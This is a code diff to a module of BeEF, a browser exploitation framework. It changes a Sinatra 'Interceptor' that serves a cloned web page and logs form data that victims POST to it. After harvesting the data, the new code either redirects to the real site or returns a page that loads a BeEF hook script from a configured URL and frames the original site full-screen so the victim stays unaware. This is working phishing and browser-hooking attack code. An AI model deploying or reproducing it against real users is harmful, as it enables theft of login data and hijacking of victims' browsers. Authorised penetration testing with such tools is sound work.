@@ -19,24 +19,25 @@ module BeEF
 
       class Interceptor < Sinatra::Base
 
-      def initialize(file_path, redirect_to)
+      def initialize(file_path, redirect_to, frameable, beef_hook)
         super self
         file = File.open(file_path,'r')
         @cloned_page = file.read
         @redirect_to = redirect_to
+        @frameable = frameable
+        @beef_hook = beef_hook
         file.close
-        print_info "Cloned page using content from [cloned_pages/#{File.basename(file_path)}] initialized."
+        print_info "Cloned page with content from [cloned_pages/#{File.basename(file_path)}] initialized."
       end
 
       # intercept GET
       get "/" do
         print_info "GET request"
+        print_info "Referer: #{request.referer}"
         @cloned_page
       end
 
       # intercept POST
-      # the 'action' attribute of the 'form' element is modified to the URI /
-      # in this way the request can be intercepted
       post "/" do
         print_info "POST request"
         request.body.rewind
@@ -44,13 +45,14 @@ module BeEF
         print_info "Intercepted data:"
         print_info data
 
-        redirect @redirect_to
-
-        #todo: do a GET request on the target website, retrieve the respone headers and check if X-Frame-Options is present
-        #todo: or framebusting is present. If is not present, open the original URL in an iFrame, otherwise redirect the user
-        #todo: to the original page
+        if @frameable
+          print_info "Page can be framed :-) Loading original URL into iFrame..."
+          "<html><head><script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head></head><body><iframe src=\"#{@redirect_to}\" style=\"border:none; background-color:white; width:100%; height:100%; position:absolute; top:0px; left:0px; padding:0px; margin:0px\"></iframe></body></html>"
+        else
+          print_info "Page can not be framed :-) Redirecting to original URL..."
+          redirect @redirect_to
+        end
       end
-
       end
     end
   end
